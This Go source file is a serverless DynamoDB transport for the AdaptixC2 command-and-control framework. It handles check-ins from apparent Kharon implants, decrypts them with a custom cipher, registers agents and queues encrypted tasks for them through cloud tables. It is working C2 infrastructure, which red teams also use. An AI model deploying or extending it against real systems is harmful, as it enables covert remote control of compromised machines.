package main

import (
	"context"
	"encoding/base64"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"log"
	"sync"
	"time"

	"github.com/aws/aws-sdk-go-v2/aws"
	awsconfig "github.com/aws/aws-sdk-go-v2/config"
	"github.com/aws/aws-sdk-go-v2/feature/dynamodb/attributevalue"
	"github.com/aws/aws-sdk-go-v2/service/dynamodb"
	"github.com/aws/aws-sdk-go-v2/service/dynamodb/types"
	"github.com/google/uuid"
)

const (
	wireAgentIDSize = 36
	adaptixIDSize   = 8
	encryptKeySize  = 16
	xorKeySize      = 16
	lokBlockSize    = 8
	lokNumRounds    = 16

	kharonWatermark = "c17a905a"

	taskGet    byte = 0
	taskResult byte = 1
	taskQuick  byte = 0x5
	taskOut    byte = 0x7
)

// ============================================================
//  LokyCrypt (matches Kharon's pl_lokycrypt.go exactly)
// ============================================================

type LokyCrypt struct {
	Key    [encryptKeySize]byte
	XorKey [xorKeySize]byte
}

func NewLokyCrypt(key []byte, xorKey []byte) *LokyCrypt {
	lc := &LokyCrypt{}
	copy(lc.Key[:], key)
	copy(lc.XorKey[:], xorKey)
	return lc
}

func bytesToUint32BE(b []byte) uint32 {
	return (uint32(b[0]) << 24) |
		(uint32(b[1]) << 16) |
		(uint32(b[2]) << 8) |
		uint32(b[3])
}

func uint32ToBytesBE(val uint32) []byte {
	return []byte{
		byte((val >> 24) & 0xFF),
		byte((val >> 16) & 0xFF),
		byte((val >> 8) & 0xFF),
		byte(val & 0xFF),
	}
}

func (lc *LokyCrypt) Cycle(block []byte, encrypt bool) {
	left := bytesToUint32BE(block[0:4])
	right := bytesToUint32BE(block[4:8])

	if encrypt {
		for i := 0; i < lokNumRounds; i++ {
			tmp := right
			right = left ^ (right + uint32(lc.Key[i%len(lc.Key)]))
			left = tmp
		}
	} else {
		for i := lokNumRounds - 1; i >= 0; i-- {
			tmp := left
			left = right ^ (left + uint32(lc.Key[i%len(lc.Key)]))
			right = tmp
		}
	}

	copy(block[0:4], uint32ToBytesBE(left))
	copy(block[4:8], uint32ToBytesBE(right))
}

func (lc *LokyCrypt) CalcPadding(length int) int {
	if length%lokBlockSize == 0 {
		return length + lokBlockSize
	}
	return length + (lokBlockSize - (length % lokBlockSize))
}

func (lc *LokyCrypt) AddPadding(data []byte, length int, total int) []byte {
	padLen := byte(total - length)
	result := make([]byte, total)
	copy(result, data[:length])
	for i := length; i < total; i++ {
		result[i] = padLen
	}
	return result
}

func (lc *LokyCrypt) Encrypt(data []byte) []byte {
	length := len(data)
	total := lc.CalcPadding(length)
	padded := lc.AddPadding(data, length, total)

	encrypted := make([]byte, total)
	copy(encrypted, padded)

	for i := 0; i < total; i += lokBlockSize {
		lc.Cycle(encrypted[i:i+lokBlockSize], true)
	}
	return encrypted
}

func (lc *LokyCrypt) Decrypt(data []byte) []byte {
	if len(data)%lokBlockSize != 0 || len(data) == 0 {
		return data
	}

	decrypted := make([]byte, len(data))
	copy(decrypted, data)

	for i := 0; i < len(decrypted); i += lokBlockSize {
		lc.Cycle(decrypted[i:i+lokBlockSize], false)
	}

	return lc.rmPadding(decrypted)
}

func (lc *LokyCrypt) rmPadding(data []byte) []byte {
	if len(data) < lokBlockSize {
		return data
	}

	padLen := int(data[len(data)-1])
	if padLen == 0 || padLen > lokBlockSize || len(data) < padLen {
		return data
	}

	for i := len(data) - padLen; i < len(data); i++ {
		if data[i] != byte(padLen) {
			return data
		}
	}

	return data[:len(data)-padLen]
}

func bytesEqual(a, b []byte) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}

func (lc *LokyCrypt) Xor(data []byte) {
	for i, j := 0, 0; i < len(data); i++ {
		if j == len(lc.XorKey) {
			j = 0
		}
		if i%2 == 0 {
			data[i] ^= lc.XorKey[j]
		} else {
			data[i] ^= lc.XorKey[j] ^ byte(j)
		}
		j++
	}
}

// ============================================================
//  DynamoDB record types
// ============================================================

type InboundItem struct {
	ID        string `dynamodbav:"id"`
	AgentID   string `dynamodbav:"agent_id"`
	Timestamp string `dynamodbav:"timestamp"`
	RawData   []byte `dynamodbav:"raw_data"`
	Processed bool   `dynamodbav:"processed"`
	TTL       int64  `dynamodbav:"ttl"`
}

type OutboundItem struct {
	ID           string `dynamodbav:"id"`
	AgentID      string `dynamodbav:"agent_id"`
	Timestamp    int64  `dynamodbav:"timestamp"`
	ResponseData []byte `dynamodbav:"response_data"`
	Delivered    bool   `dynamodbav:"delivered"`
	TTL          int64  `dynamodbav:"ttl"`
}

// ============================================================
//  agentState tracks per-agent crypto and identity
// ============================================================

type agentState struct {
	adaptixID   string
	oldAgentID  []byte
	encryptKey  []byte
}

// ============================================================
//  TransportServerless
// ============================================================

type TransportServerless struct {
	Name   string
	Config ServerlessConfig
	Active bool

	stopCh   chan struct{}
	stopOnce sync.Once
	wg       sync.WaitGroup

	dbClient *dynamodb.Client

	agents map[string]*agentState
	mu     sync.RWMutex
}

func NewTransportServerless(name string, config ServerlessConfig) *TransportServerless {
	return &TransportServerless{
		Name:   name,
		Config: config,
		agents: make(map[string]*agentState),
	}
}

// ============================================================
//  Start / Stop
// ============================================================

func (t *TransportServerless) Start() error {
	t.stopCh = make(chan struct{})
	t.stopOnce = sync.Once{}
	t.Active = true

	cfg, err := awsconfig.LoadDefaultConfig(context.Background(),
		awsconfig.WithRegion(t.Config.Region),
	)
	if err != nil {
		return fmt.Errorf("failed to load AWS config: %w", err)
	}

	t.dbClient = dynamodb.NewFromConfig(cfg)

	checkCtx, checkCancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer checkCancel()
	_, err = t.dbClient.DescribeTable(checkCtx, &dynamodb.DescribeTableInput{
		TableName: aws.String(t.Config.InboundTable),
	})
	if err != nil {
		log.Printf("[serverless:%s] warning: inbound table check failed: %v", t.Name, err)
	}

	t.wg.Add(1)
	go t.pollLoop()

	log.Printf("[serverless:%s] transport started, polling %s every %ds",
		t.Name, t.Config.InboundTable, t.Config.PollInterval)

	return nil
}

func (t *TransportServerless) Stop() error {
	t.stopOnce.Do(func() {
		if t.stopCh != nil {
			close(t.stopCh)
		}
	})
	t.wg.Wait()
	t.Active = false
	log.Printf("[serverless:%s] transport stopped", t.Name)
	return nil
}

// ============================================================
//  Poll loop
// ============================================================

func (t *TransportServerless) pollLoop() {
	defer t.wg.Done()

	interval := time.Duration(t.Config.PollInterval) * time.Second
	if interval < time.Second {
		interval = 5 * time.Second
	}

	ticker := time.NewTicker(interval)
	defer ticker.Stop()

	for {
		select {
		case <-t.stopCh:
			return
		case <-ticker.C:
			t.processCheckins()
		}
	}
}

// ============================================================
//  Core processing
// ============================================================

func (t *TransportServerless) processCheckins() {
	ctx, cancel := context.WithTimeout(context.Background(), 120*time.Second)
	defer cancel()

	scanInput := &dynamodb.ScanInput{
		TableName:        aws.String(t.Config.InboundTable),
		FilterExpression: aws.String("#proc = :false"),
		ExpressionAttributeNames: map[string]string{
			"#proc": "processed",
		},
		ExpressionAttributeValues: map[string]types.AttributeValue{
			":false": &types.AttributeValueMemberBOOL{Value: false},
		},
	}

	scanResult, err := t.dbClient.Scan(ctx, scanInput)
	if err != nil {
		log.Printf("[serverless:%s] scan error: %v", t.Name, err)
		return
	}

	if len(scanResult.Items) == 0 {
		return
	}

	log.Printf("[serverless:%s] found %d unprocessed inbound records", t.Name, len(scanResult.Items))

	for _, item := range scanResult.Items {
		select {
		case <-t.stopCh:
			return
		default:
		}

		var record InboundItem
		if err := attributevalue.UnmarshalMap(item, &record); err != nil {
			log.Printf("[serverless:%s] unmarshal error: %v", t.Name, err)
			continue
		}

		if len(record.RawData) == 0 {
			t.markProcessed(ctx, record.ID)
			continue
		}

		if err := t.handleInboundRecord(ctx, &record); err != nil {
			log.Printf("[serverless:%s] error: %v", t.Name, err)
		}

		t.markProcessed(ctx, record.ID)
	}
}

// handleInboundRecord processes a single inbound DynamoDB record.
//
// Kharon wire format (after profile client_output decoding):
//
//	New agent:     [old_agent_id: 36] [encrypted_payload: N] [encrypt_key: 16]
//	Existing agent:[agent_id: 36]     [encrypted_payload: N] (key already stored)
//
// The AdaptixC2 agent ID is only the first 8 bytes of the 36-byte prefix.
func (t *TransportServerless) handleInboundRecord(ctx context.Context, record *InboundItem) error {
	raw := record.RawData

	// GET requests store base64 text as binary (profile client_output.format = "base64").
	// POST requests store raw binary (Lambda decoded the Function URL's base64 wrapper).
	// Try base64 decode to normalize both to raw Kharon binary.
	origLen := len(raw)
	decoded64 := false
	if decoded, err := base64.StdEncoding.DecodeString(string(raw)); err == nil && len(decoded) >= wireAgentIDSize {
		raw = decoded
		decoded64 = true
	} else if decoded, err := base64.RawStdEncoding.DecodeString(string(raw)); err == nil && len(decoded) >= wireAgentIDSize {
		raw = decoded
		decoded64 = true
	}
	log.Printf("[DEBUG:%s] inbound origLen=%d decodedB64=%v finalLen=%d", t.Name, origLen, decoded64, len(raw))

	if len(raw) < wireAgentIDSize {
		return nil
	}

	wireID := string(raw[:adaptixIDSize])

	// Check if this is from a known agent (in-memory)
	t.mu.RLock()
	state, known := t.agents[wireID]
	t.mu.RUnlock()

	if known {
		return t.handleExistingAgent(ctx, state, raw)
	}

	// Try to recover key from persistent store (survives restarts)
	if Ts.TsAgentIsExists(wireID) {
		storedKey, err := Ts.TsExtenderDataLoad(t.Name, "key_"+wireID)
		if err == nil && len(storedKey) == encryptKeySize {
			log.Printf("[serverless:%s] recovered key for agent %s from persistent store", t.Name, wireID)
			st := &agentState{
				adaptixID:  wireID,
				encryptKey: storedKey,
			}
			t.mu.Lock()
			t.agents[wireID] = st
			t.mu.Unlock()
			return t.handleExistingAgent(ctx, st, raw)
		}
	}

	// Try all stored keys (like the Kharon HTTP listener does)
	keys, err := Ts.TsExtenderDataKeys(t.Name)
	if err == nil {
		for _, k := range keys {
			if len(k) < 5 || k[:4] != "key_" {
				continue
			}
			agentID := k[4:]
			if !Ts.TsAgentIsExists(agentID) {
				continue
			}
			storedKey, err := Ts.TsExtenderDataLoad(t.Name, k)
			if err != nil || len(storedKey) != encryptKeySize {
				continue
			}
			// The first 8 bytes of the wire should match this agent's ID
			// For agents that re-registered with a new ID, both old and new
			// IDs are stored. If the wire ID matches, use this key.
			if wireID == agentID {
				log.Printf("[serverless:%s] matched key for %s via key scan", t.Name, wireID)
				st := &agentState{
					adaptixID:  wireID,
					encryptKey: storedKey,
				}
				t.mu.Lock()
				t.agents[wireID] = st
				t.mu.Unlock()
				return t.handleExistingAgent(ctx, st, raw)
			}
		}
	}

	// New agent requires at least: 36 (id) + 16 (key) = 52 bytes
	minNewAgent := wireAgentIDSize + encryptKeySize
	if len(raw) < minNewAgent {
		return nil
	}

	return t.handleNewAgent(ctx, raw)
}

// handleNewAgent processes an initial checkin from an unregistered agent.
func (t *TransportServerless) handleNewAgent(ctx context.Context, raw []byte) error {
	totalLen := len(raw)
	extractedKey := make([]byte, encryptKeySize)
	copy(extractedKey, raw[totalLen-encryptKeySize:])

	oldAgentID := make([]byte, wireAgentIDSize)
	copy(oldAgentID, raw[:wireAgentIDSize])

	adaptixID := string(oldAgentID[:adaptixIDSize])

	encryptedData := raw[wireAgentIDSize : totalLen-encryptKeySize]

	log.Printf("[serverless:%s] new agent candidate id=%s wireLen=%d encryptedLen=%d",
		t.Name, adaptixID, totalLen, len(encryptedData))

	if len(encryptedData) == 0 {
		return t.registerHeartbeatOnly(ctx, adaptixID, oldAgentID, extractedKey)
	}

	crypt := NewLokyCrypt(extractedKey, extractedKey)
	decrypted := crypt.Decrypt(encryptedData)

	if len(decrypted) == 0 {
		return fmt.Errorf("decryption produced empty result for %s", adaptixID)
	}

	agentDataRes, err := Ts.TsAgentCreate(kharonWatermark, adaptixID, decrypted, t.Name, "serverless", true)
	if err != nil {
		return fmt.Errorf("create agent %s: %w", adaptixID, err)
	}

	newAdaptixID := agentDataRes.Id
	log.Printf("[serverless:%s] registered agent old=%s new=%s", t.Name, adaptixID, newAdaptixID)

	// Store key for both old and new IDs
	t.mu.Lock()
	st := &agentState{
		adaptixID:  newAdaptixID,
		oldAgentID: oldAgentID,
		encryptKey: extractedKey,
	}
	t.agents[adaptixID] = st
	if newAdaptixID != adaptixID {
		t.agents[newAdaptixID] = st
	}
	t.mu.Unlock()

	// Persist key so it survives restarts
	_ = Ts.TsExtenderDataSave(t.Name, "key_"+adaptixID, extractedKey)
	if newAdaptixID != adaptixID {
		_ = Ts.TsExtenderDataSave(t.Name, "key_"+newAdaptixID, extractedKey)
	}

	// Generate registration response: [oldID + Encrypt(newID)]
	// Matches KharonHTTP's process_request new-agent response
	randomID := make([]byte, 19)
	rand.Read(randomID)
	newID := []byte(newAdaptixID + hex.EncodeToString(randomID))

	encryptedNewID := crypt.Encrypt(newID)
	combined := append(oldAgentID, encryptedNewID...)

	// Apply server_output.format = "base64" (matching the malleable profile)
	responseData := []byte(base64.StdEncoding.EncodeToString(combined))

	return t.storeOutbound(ctx, adaptixID, responseData)
}

// registerHeartbeatOnly handles a new agent with no encrypted data (heartbeat).
func (t *TransportServerless) registerHeartbeatOnly(ctx context.Context, adaptixID string, oldAgentID []byte, key []byte) error {
	t.mu.Lock()
	t.agents[adaptixID] = &agentState{
		adaptixID:  adaptixID,
		oldAgentID: oldAgentID,
		encryptKey: key,
	}
	t.mu.Unlock()

	if Ts.TsAgentIsExists(adaptixID) {
		_ = Ts.TsAgentSetTick(adaptixID, t.Name)
	}
	return nil
}

// handleExistingAgent processes data from a registered agent.
func (t *TransportServerless) handleExistingAgent(ctx context.Context, state *agentState, raw []byte) error {
	totalLen := len(raw)

	_ = Ts.TsAgentSetTick(state.adaptixID, t.Name)

	// The wire UUID from the current request (first 36 bytes).
	// For !Connected packets with key stomping, bytes 28-35 are overwritten
	// by key bytes, but we still use state.oldAgentID for the response prefix
	// in that case. For Connected packets, this is the agent's current UUID.
	wireUUID := raw[:wireAgentIDSize]

	// Detect !Connected wire format: when the payload is small, the 16-byte
	// key written at TotalPacketLen-16 stomps into the UUID area (offset < 36).
	if totalLen >= encryptKeySize && totalLen < wireAgentIDSize+lokBlockSize+encryptKeySize {
		tailKey := raw[totalLen-encryptKeySize:]
		if bytesEqual(tailKey, state.encryptKey) {
			log.Printf("[serverless:%s] heartbeat from unconnected agent %s (key in tail, len=%d)",
				t.Name, state.adaptixID, totalLen)
			return t.deliverQueuedTasks(ctx, state, state.oldAgentID)
		}
	}

	encryptedData := raw[wireAgentIDSize:]

	if len(encryptedData) == 0 {
		return t.deliverQueuedTasks(ctx, state, wireUUID)
	}

	// Strip key from tail if present (larger !Connected packets)
	if totalLen >= wireAgentIDSize+encryptKeySize+lokBlockSize {
		tailKey := raw[totalLen-encryptKeySize:]
		if bytesEqual(tailKey, state.encryptKey) {
			encryptedData = raw[wireAgentIDSize : totalLen-encryptKeySize]
			if len(encryptedData) == 0 {
				return t.deliverQueuedTasks(ctx, state, state.oldAgentID)
			}
		}
	}

	if len(encryptedData)%lokBlockSize != 0 {
		log.Printf("[serverless:%s] encrypted data not block-aligned (%d bytes) for %s, treating as heartbeat",
			t.Name, len(encryptedData), state.adaptixID)
		return t.deliverQueuedTasks(ctx, state, wireUUID)
	}

	crypt := NewLokyCrypt(state.encryptKey, state.encryptKey)
	decrypted := crypt.Decrypt(encryptedData)

	if len(decrypted) == 0 {
		return t.deliverQueuedTasks(ctx, state, wireUUID)
	}

	taskAction := decrypted[0]

	switch taskAction {
	case taskGet:
		return t.deliverQueuedTasks(ctx, state, wireUUID)

	case taskResult:
		if len(decrypted) > 1 {
			if err := Ts.TsAgentProcessData(state.adaptixID, decrypted[1:]); err != nil {
				log.Printf("[serverless:%s] process data error for %s: %v", t.Name, state.adaptixID, err)
			}
		}
		return t.deliverQueuedTasks(ctx, state, wireUUID)

	case taskOut, taskQuick:
		msgTypePattern := append([]byte{0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0}, decrypted...)
		if err := Ts.TsAgentProcessData(state.adaptixID, msgTypePattern); err != nil {
			log.Printf("[serverless:%s] process data error for %s: %v", t.Name, state.adaptixID, err)
		}
		return t.deliverQueuedTasks(ctx, state, wireUUID)

	default:
		log.Printf("[serverless:%s] unknown task action 0x%x from %s", t.Name, taskAction, state.adaptixID)
		return t.deliverQueuedTasks(ctx, state, wireUUID)
	}
}

// deliverQueuedTasks fetches pending tasks and stores them in the outbound table.
// wireUUID is the 36-byte UUID prefix from the current request; the response
// must echo it back so the agent's Transmit can parse the reply.
func (t *TransportServerless) deliverQueuedTasks(ctx context.Context, state *agentState, wireUUID []byte) error {
	hostedData, err := Ts.TsAgentGetHostedAll(state.adaptixID, 0x12c0000)
	if err != nil {
		return fmt.Errorf("get hosted tasks for %s: %w", state.adaptixID, err)
	}

	if len(hostedData) == 0 {
		return nil
	}

	crypt := NewLokyCrypt(state.encryptKey, state.encryptKey)
	encrypted := crypt.Encrypt(hostedData)

	combined := make([]byte, wireAgentIDSize+len(encrypted))
	copy(combined, wireUUID[:wireAgentIDSize])
	copy(combined[wireAgentIDSize:], encrypted)

	// Apply server_output.format = "base64"
	responseData := []byte(base64.StdEncoding.EncodeToString(combined))

	log.Printf("[serverless:%s] queued %d bytes response for agent %s", t.Name, len(responseData), state.adaptixID)
	return t.storeOutbound(ctx, state.adaptixID, responseData)
}

// ============================================================
//  DynamoDB operations
// ============================================================

func (t *TransportServerless) storeOutbound(ctx context.Context, agentID string, data []byte) error {
	now := time.Now()
	ttl := now.Add(time.Duration(t.Config.TTLHours) * time.Hour).Unix()

	item := OutboundItem{
		ID:           uuid.New().String(),
		AgentID:      agentID,
		Timestamp:    now.Unix(),
		ResponseData: data,
		Delivered:    false,
		TTL:          ttl,
	}

	av, err := attributevalue.MarshalMap(item)
	if err != nil {
		return fmt.Errorf("marshal outbound item: %w", err)
	}

	_, err = t.dbClient.PutItem(ctx, &dynamodb.PutItemInput{
		TableName: aws.String(t.Config.OutboundTable),
		Item:      av,
	})
	if err != nil {
		return fmt.Errorf("put outbound item for %s: %w", agentID, err)
	}

	return nil
}

func (t *TransportServerless) markProcessed(ctx context.Context, recordID string) {
	_, err := t.dbClient.UpdateItem(ctx, &dynamodb.UpdateItemInput{
		TableName: aws.String(t.Config.InboundTable),
		Key: map[string]types.AttributeValue{
			"id": &types.AttributeValueMemberS{Value: recordID},
		},
		UpdateExpression: aws.String("SET #proc = :true"),
		ExpressionAttributeNames: map[string]string{
			"#proc": "processed",
		},
		ExpressionAttributeValues: map[string]types.AttributeValue{
			":true": &types.AttributeValueMemberBOOL{Value: true},
		},
	})
	if err != nil {
		log.Printf("[serverless:%s] failed to mark record %s processed: %v", t.Name, recordID, err)
	}
}
